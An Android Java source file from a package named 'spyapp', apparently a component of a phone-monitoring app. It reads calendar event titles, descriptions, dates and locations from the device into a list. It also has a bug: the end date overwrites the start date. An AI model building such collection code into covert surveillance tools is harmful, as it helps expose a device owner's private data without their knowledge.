package com.app.spyapp.service;

import android.Manifest;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.v4.app.ActivityCompat;
import android.text.TextUtils;

import com.app.spyapp.common.Utils;
import com.app.spyapp.model.EventModel;

import java.util.ArrayList;


public class CalenderEventService extends IntentService {


    public CalenderEventService() {
        super(CalenderEventService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Utils.showStatus(this, "Calender Event");

        readCalendarEvent(this);
    }


    public ArrayList<EventModel> readCalendarEvent(Context context) {
        ArrayList<EventModel> eventList = new ArrayList<>();
        Cursor cursor = context.getContentResolver()
                .query(
                        Uri.parse("content://com.android.calendar/events"),
                        new String[]{"calendar_id", "title", "description",
                                "dtstart", "dtend", "eventLocation", "_id"}, null,
                        null, null);
        cursor.moveToFirst();
        // fetching calendars name
        String CNames[] = new String[cursor.getCount()];

        // fetching calendars id
        for (int i = 0; i < CNames.length; i++) {

            EventModel eventModel = new EventModel();
            eventModel.setTitle(cursor.getString(1));
            eventModel.setDesc(cursor.getString(2));
            if (!TextUtils.isEmpty(cursor.getString(3))) {
                eventModel.setStartDate(Utils.convertMilisToDate(Long.parseLong(cursor.getString(3))));
            }
            if (!TextUtils.isEmpty(cursor.getString(4))) {
                eventModel.setStartDate(Utils.convertMilisToDate(Long.parseLong(cursor.getString(4))));
            }
            eventModel.setLocation(cursor.getString(5));
            eventList.add(eventModel);
            cursor.moveToNext();

        }
        return eventList;
    }


}
